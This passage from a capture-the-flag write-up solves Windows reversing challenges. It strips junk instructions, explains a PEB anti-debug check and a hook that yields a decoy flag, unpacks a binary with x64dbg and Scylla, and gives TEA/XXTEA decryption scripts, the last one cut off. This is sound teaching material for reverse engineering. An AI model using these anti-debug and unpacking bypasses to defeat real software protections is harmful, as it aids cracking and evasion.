src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828863-fffea6a3-e0ed-4f7f-bd78-ba319fdb93b0.png#averageHue=%23242120&clientId=u9fbe6832-1fb1-4&from=paste&id=u640b1518&originHeight=256&originWidth=819&originalType=url&ratio=1&rotation=0&showTitle=false&size=27837&status=done&style=none&taskId=ub41b481a-0633-41c0-9641-9f79986b3f5&title=" alt="image.png"><br>这个是一个简单的jmp花指令，把后面的jmp nop掉，然后可以看到第一部分。<br>这时最上面还是有标红<br>在汇编界面看看哪里还有花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828840-9379adb2-bb79-47ec-8e66-6b0b6186244b.png#averageHue=%23211f1f&clientId=u9fbe6832-1fb1-4&from=paste&id=uf2076b9a&originHeight=447&originWidth=1027&originalType=url&ratio=1&rotation=0&showTitle=false&size=46966&status=done&style=none&taskId=ue7e65699-3668-4960-a21a-b46ea68bd25&title=" alt="image.png"><br>这里有一个奇怪的call：<br>逻辑是：call完之后把ret的值+0xC然后返回<br>把这一部分按u解除，在加0xC后的位置再反编译<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828855-22c55bc8-7fc2-4b83-8efb-7c1c9f6b986d.png#averageHue=%23222121&clientId=u9fbe6832-1fb1-4&from=paste&id=u8a8a33d3&originHeight=902&originWidth=982&originalType=url&ratio=1&rotation=0&showTitle=false&size=57530&status=done&style=none&taskId=u0a4f5158-d428-47e8-be3d-870a551763d&title=" alt="image.png"><br>所以ret之后就会到pop的位置<br>把中间这一段全部nop，然后把整个函数u，然后c，再浏览一下函数，中间有一个怪jmp，删掉<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828869-884a2f60-9285-4f64-90a8-423fd0e572e7.png#averageHue=%23383a2d&clientId=u9fbe6832-1fb1-4&from=paste&id=u4183dfaa&originHeight=914&originWidth=1121&originalType=url&ratio=1&rotation=0&showTitle=false&size=50453&status=done&style=none&taskId=u23ab1c10-a1fa-4e75-af1b-62ab76f52ea&title=" alt="image.png"><br>然后再p，得到解完花的函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall encode(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rcx</span><br><span class="line"> <span class="built_in"> int </span>v3; // eax</span><br><span class="line">  bool v4; // zf</span><br><span class="line"> <span class="built_in"> int </span>v5; // eax</span><br><span class="line"> <span class="built_in"> int </span>v7; // [rsp+2Ch] [rbp-34h]</span><br><span class="line"> <span class="built_in"> int </span>v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>i; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v10; // [rsp+38h] [rbp-28h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v11; // [rsp+3Ch] [rbp-24h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v12; // [rsp+40h] [rbp-20h]</span><br><span class="line"> <span class="built_in"> int </span>v13; // [rsp+44h] [rbp-1Ch]</span><br><span class="line">  _BYTE v15[12]; // [rsp+54h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v15[4] = a1;</span><br><span class="line">  *(_DWORD *)v15 = 0x9E3779B9;</span><br><span class="line">  v8 = 9;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 56);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 -= 0x61C88647;</span><br><span class="line">    v7 = (v10 &gt;&gt; 2) &amp; 3;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 14i64;</span><br><span class="line">     <span class="built_in"> if </span>( i &gt;= 0xE )</span><br><span class="line">        break;</span><br><span class="line">      v12 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * (i + 1));</span><br><span class="line">      v3 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i)</span><br><span class="line">         + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 &gt;&gt; 3))</span><br><span class="line">                                                                           + ((4 * v12) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i) = v3;</span><br><span class="line">      v11 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = **(_QWORD **)&amp;v15[4] == 0xEi64;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= 0xEui64;</span><br><span class="line">   <span class="built_in"> if </span>( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)v15;</span><br><span class="line">      **(_QWORD **)&amp;v15[4] += *(_QWORD *)v15;</span><br><span class="line">    &#125;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= v2;</span><br><span class="line">    v5 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64)</span><br><span class="line">       + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (**(_DWORD **)&amp;v15[4] ^ v10)) ^ (((16 * v11) ^ (**(_DWORD **)&amp;v15[4] &gt;&gt; 3))</span><br><span class="line">                                                                                          + ((4 * **(_DWORD **)&amp;v15[4]) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64) = v5;</span><br><span class="line">    v11 = v5;</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  v13 = 60;</span><br><span class="line">  while ( v13 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v13;</span><br><span class="line">   <span class="built_in"> if </span>( *(unsigned __int8 *)(*(_QWORD *)&amp;v15[4] + v13) != (byte_7FF7A5187000[v13 + 1] ^ 0x23) )</span><br><span class="line">     <span class="built_in"> return </span>0;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的特征很明显是xxtea，并且没有魔改，网上直接搜脚本<br>exp：(需要用clang)<br>(网上的脚本<a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">https://www.cnblogs.com/zpchcbd/p/15974293.html</a>)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio<span class="number">.</span>h&gt;</span><br><span class="line">#include &lt;stdint<span class="number">.</span>h&gt;</span><br><span class="line">#define DELTA <span class="number">0x9e3779b9</span></span><br><span class="line">#define MX (((z&gt;&gt;<span class="number">5</span>^y&lt;&lt;<span class="number">2</span>) + (y&gt;&gt;<span class="number">3</span>^z&lt;&lt;<span class="number">4</span>)) ^ ((sum^y) + (key[(p&amp;<span class="number">3</span>)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, <span class="keyword">int</span> n, uint32_t const key[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">uint32_t y, z, sum<span class="comment">;</span></span><br><span class="line">unsigned p, rounds, e<span class="comment">;</span></span><br><span class="line">if (n &gt; <span class="number">1</span>)            /* Coding Part */</span><br><span class="line">&#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA<span class="comment">;</span></span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = <span class="number">0</span><span class="comment">; p &lt; n - 1; p++)</span></span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">z = v[p] += MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>] += MX<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">else if (n &lt; -<span class="number">1</span>)      /* Decoding Part */</span><br><span class="line">&#123;</span><br><span class="line">n = -n<span class="comment">;</span></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = rounds * DELTA<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = n - <span class="number">1</span><span class="comment">; p &gt; 0; p--)</span></span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[p] -= MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>] -= MX<span class="comment">;</span></span><br><span class="line">sum -= DELTA<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char fakefalg[<span class="number">99</span>] = &#123; <span class="number">0xff</span>, <span class="number">0xef</span>, <span class="number">0x79</span>, <span class="number">0xbc</span>, <span class="number">0xda</span>, <span class="number">0x6c</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0xb1</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5d</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x15</span>, <span class="number">0xc1</span>, <span class="number">0x1b</span>, <span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x5a</span>, <span class="number">0x9f</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x9d</span>, <span class="number">0x44</span>, <span class="number">0x0d</span>, <span class="number">0x56</span>, <span class="number">0xfd</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x7e</span>, <span class="number">0x34</span>, <span class="number">0x5a</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x24</span>, <span class="number">0xbc</span>, <span class="number">0xe1</span>, <span class="number">0x40</span>, <span class="number">0x0d</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x68</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0x09</span>, <span class="number">0x5b</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0xb6</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x0a</span>, <span class="number">0x5e</span>, <span class="number">0xd9</span>, <span class="number">0x03</span>, <span class="number">0xb2</span>, <span class="number">0x48</span> &#125;<span class="comment">;</span></span><br><span class="line">for (<span class="keyword">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 61; ++i) &#123;</span></span><br><span class="line">fakefalg[i] ^= <span class="number">0x23</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">uint32_t key[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;<span class="comment">;</span></span><br><span class="line">btea((unsigned*)(fakefalg + <span class="number">1</span>), -<span class="number">15</span>, key)<span class="comment">;</span></span><br><span class="line">printf(<span class="string">&quot;解密后的数据：%s\n&quot;</span>, (char*)fakefalg)<span class="comment">;</span></span><br><span class="line">return <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到假flag：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;Sorry.There<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>o<span class="number">_m</span>ore<span class="number">_f</span>lower<span class="number">_</span>tea.Please<span class="number">_</span><span class="keyword">try</span><span class="number">_</span>again!!&#125;</span><br></pre></td></tr></table></figure><p>很明显，这个不是真flag，这说明：<br>动态调试的时候和正常的时候运行的逻辑不一样<br>第一时间会想到这个可能是smc或者hook<br>所以先查看encode的交叉引用。<br>于是找到这个函数：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829975-153319f8-74d5-4986-8a9e-8f768ac45af7.png#averageHue=%23262523&clientId=u9fbe6832-1fb1-4&from=paste&id=ue3859d07&originHeight=175&originWidth=342&originalType=url&ratio=1&rotation=0&showTitle=false&size=13519&status=done&style=none&taskId=u3580044d-d353-4778-a37c-19359f8ce4a&title=" alt="image.png"><br>可以看到上层函数<br>修改了encode中的前几个字节用ret的方法返回到sub_140012A0中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829989-1a9f71ea-f342-424a-af46-2cb10c1d5fee.png#averageHue=%23212120&clientId=u9fbe6832-1fb1-4&from=paste&id=uc3c9f92e&originHeight=449&originWidth=1207&originalType=url&ratio=1&rotation=0&showTitle=false&size=33860&status=done&style=none&taskId=uf9eb6404-6a25-4a29-80c0-ffd3c2e2565&title=" alt="image.png"><br>这里的第一个是反调试，在x64下，调试标志位在PEB表偏移0x2的位置，通过获取gs寄存器找到peb表的位置：<br>readsqword(0x62)得到调试标志位并判断当前进程是否在调试<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829985-4afa9be0-9bb4-4cb8-9f55-5dd9c717c765.png#averageHue=%23232222&clientId=u9fbe6832-1fb1-4&from=paste&id=u7808a012&originHeight=180&originWidth=741&originalType=url&ratio=1&rotation=0&showTitle=false&size=9782&status=done&style=none&taskId=ud6d90f24-7c4d-416e-a406-ac032578606&title=" alt="image.png"><br>block是单纯地得到对应的两个函数地址<br>get_virtual_protect中，通过异或把virtualprotect函数名隐藏并通过搜索它在kernel32.dll中位置返回函数地址<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829987-92034861-23bc-47d2-9e95-b4f30fa85fbe.png#averageHue=%23232221&clientId=u9fbe6832-1fb1-4&from=paste&id=ud99782d9&originHeight=483&originWidth=557&originalType=url&ratio=1&rotation=0&showTitle=false&size=29585&status=done&style=none&taskId=u93815ed8-e441-450f-b0cc-314164f4205&title=" alt="image.png"><br>通过上面的分析，可以得出我们需要查看sub_140012A0的内容，这里才是真正的加密函数<br>打开，还是花QAQ<br>汇编中，可以看到函数后段全是一个指令+一个jmp<br>由于汇编不是很好看，改成流程图看奇怪的地方。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829973-15def95e-8069-44cd-91a5-819ab44df3c5.png#averageHue=%23343436&clientId=u9fbe6832-1fb1-4&from=paste&id=u120b6f3f&originHeight=899&originWidth=326&originalType=url&ratio=1&rotation=0&showTitle=false&size=9261&status=done&style=none&taskId=u70f5eff6-e16f-4590-91c9-49d7be337ea&title=" alt="image.png"><br>可以猜测：如果一个地方有一块代码，并且有连续jmp，这里可能是人工加的花<br>那么就先看一下那个很远的环和上面一排没有入口的块<br>1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832192-cef5fe2c-e686-4d46-b327-e5d7a3c01b20.png#averageHue=%23212120&clientId=u9fbe6832-1fb1-4&from=paste&id=u0fa192bf&originHeight=821&originWidth=634&originalType=url&ratio=1&rotation=0&showTitle=false&size=53017&status=done&style=none&taskId=u0aa49f92-479d-4bac-b428-67c7d183fb5&title=" alt="image.png"><br>这里能看到push和pop，所以从push进入花，从pop离开花，可以看出可以这样还原<br>2<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832265-37061b1b-0f12-4caf-8153-cba463e120d5.png#averageHue=%23242322&clientId=u9fbe6832-1fb1-4&from=paste&id=u065c3468&originHeight=933&originWidth=1035&originalType=url&ratio=1&rotation=0&showTitle=false&size=123404&status=done&style=none&taskId=u110b76e5-e698-4870-9616-0dac6ca2b32&title=" alt="image.png"><br>这里有一个call，尝试跟着call走，它下一步修改了返回地址，减去5A<br>即：140001460<br>转换一下这里的指令<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832191-1cc0fbe0-3f81-4909-a497-5295e5abc4db.png#averageHue=%23282726&clientId=u9fbe6832-1fb1-4&from=paste&id=u50bfb4ab&originHeight=50&originWidth=338&originalType=url&ratio=1&rotation=0&showTitle=false&size=2785&status=done&style=none&taskId=ueb56bbeb-3453-4f58-b939-3e8e83aa1b3&title=" alt="image.png"><br>所以把call nop了就好<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832182-3eb75a93-c094-4099-be25-76c4f9d44050.png#averageHue=%23535739&clientId=u9fbe6832-1fb1-4&from=paste&id=ue655d849&originHeight=215&originWidth=428&originalType=url&ratio=1&rotation=0&showTitle=false&size=3787&status=done&style=none&taskId=u28dc4c33-1a0b-4666-82b4-37908298542&title=" alt="image.png"><br>3<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832201-20c08a69-26d7-4428-95f8-6a320ed5339b.png#averageHue=%23232221&clientId=u9fbe6832-1fb1-4&from=paste&id=u9a6a4d18&originHeight=270&originWidth=476&originalType=url&ratio=1&rotation=0&showTitle=false&size=12030&status=done&style=none&taskId=u6996037f-ff56-4fac-9424-57aa1df09f5&title=" alt="image.png"><br>nop之后<br>然后全部u，c，p还原函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834495-e9f6427f-ca83-4dc5-9162-da08a490e772.png#averageHue=%2320201f&clientId=u9fbe6832-1fb1-4&from=paste&id=ua1b08400&originHeight=941&originWidth=1251&originalType=url&ratio=1&rotation=0&showTitle=false&size=66758&status=done&style=none&taskId=ud999defe-5b98-4c43-b6af-623c89dd5f4&title=" alt="image.png"><br>这里又可以看到上面的一个奇怪return，看汇编可以发现还是一个花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834450-c2ef6d71-3686-447f-ab49-66e8d87bac19.png#averageHue=%23272221&clientId=u9fbe6832-1fb1-4&from=paste&id=uad94fd86&originHeight=387&originWidth=835&originalType=url&ratio=1&rotation=0&showTitle=false&size=28232&status=done&style=none&taskId=uddf8219b-4679-4003-a0a0-f0876da42bd&title=" alt="image.png"><br>直接把call到retn去掉（除了shl）<br>这是一个变体tea，尝试化简这个函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834514-bfee2ec3-61aa-4829-9c9b-096656970bac.png#averageHue=%2320201f&clientId=u9fbe6832-1fb1-4&from=paste&id=uc65b387a&originHeight=910&originWidth=974&originalType=url&ratio=1&rotation=0&showTitle=false&size=89317&status=done&style=none&taskId=uc8d53d53-53c1-44c7-af9e-dc9500873e0&title=" alt="image.png"><br>写脚本直接解<br>exp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dectrueTEA</span><span class="params">(<span class="type">uint32_t</span>* flag, <span class="type">uint32_t</span>* key, <span class="type">uint32_t</span> E)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> delta[<span class="number">4</span>] = &#123; <span class="number">0x59578627</span> ,<span class="number">0xe1c49e72</span>,<span class="number">0xbc24167f</span> ,<span class="number">0x8c3da26b</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> e = E;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> len = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span>* c[<span class="number">4</span>] = &#123; &amp;flag[(len - (i + <span class="number">3</span>)) % len],&amp;flag[(len - (i + <span class="number">2</span>)) % len],&amp;flag[(len - (i + <span class="number">1</span>)) % len],&amp;flag[(len - i) % len] &#125;;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">32</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">*c[<span class="number">3</span>] -= ((e ^ *c[<span class="number">2</span>]) ^ (key[(j + <span class="number">3</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">2</span>)) ^ (e &lt;&lt; <span class="number">1</span>);</span><br><span class="line">e -= delta[*c[<span class="number">3</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">2</span>] -= ((e ^ *c[<span class="number">1</span>]) ^ (key[(j + <span class="number">2</span>) % <span class="number">4</span>] &lt;&lt; <span class="number">3</span>)) ^ (e &gt;&gt; <span class="number">2</span>);</span><br><span class="line">e -= delta[*c[<span class="number">2</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">1</span>] -= ((e ^ *c[<span class="number">0</span>]) ^ (key[(j + <span class="number">1</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">1</span>)) ^ (e &lt;&lt; <span class="number">4</span>);</span><br><span class="line">e -= delta[*c[<span class="number">1</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">0</span>] -= ((e ^ *c[<span class="number">3</span>]) ^ (key[j % <span class="number">4</span>] &lt;&lt; <span class="number">2</span>)) ^ (e &gt;&gt; <span class="number">3</span>);</span><br><span class="line">e -= delta[*c[<span class="number">0</span>] % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;\n0x%x 0x%x 0x%x 0x%x\n&quot;, *c[0], *c[1], *c[2], *c[3]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> E = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> k1[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> a[] = &#123; <span class="number">0x127DC4E1</span>, <span class="number">0xCBA0EC0E</span>, <span class="number">0x570EDF5B</span>, <span class="number">0x99062A35</span>, <span class="number">0x382A7E1B</span>, <span class="number">0x15E46742</span>, <span class="number">0x4E5E456F</span>, <span class="number">0x3834C1D6</span>, <span class="number">0x5EF778A5</span>, <span class="number">0xAF217212</span>, <span class="number">0xC2D79D20</span>, <span class="number">0xD5C5935F</span>, <span class="number">0xCD2F5BB</span>, <span class="number">0xC527398C</span>, <span class="number">0x5EAC6739</span> &#125;;</span><br><span class="line">E = <span class="number">0xAE58570C</span>;</span><br><span class="line"><span class="built_in">dectrueTEA</span>(a, k1, E);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>die看不出来壳，但是ida可以，所以用x64dbg到脱完壳的地方，</p><p>不过得先调试，结果用ida调试直接寄在tls的call rax里面，用x64dbg一点事都没有，百思不得其解，最后发现</p><p><img src="https://s2.loli.net/2024/05/29/lfk2bu7oR6UGThp.png" alt="image-20240529215820329"></p><p>tls里面有个反调试，在解壳之前，所以得先跳过，dbg里面自带的插件直接秒了，所以dbg就没事QAQ</p><p>这个感觉很不错，要是有办法在ida里面用就好了</p><p>记录一下用工具修复iat表的过程：</p><p>x64dbg 插件 scylla</p><p><img src="https://s2.loli.net/2024/05/29/Q8fl1qEwGeXRmZx.png" alt="image-20240529205550754"></p><p>去反调试，然后把smc搞出来，直接解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = [<span class="number">0xCF</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0xC8</span>, <span class="number">0xDF</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0xD2</span>, <span 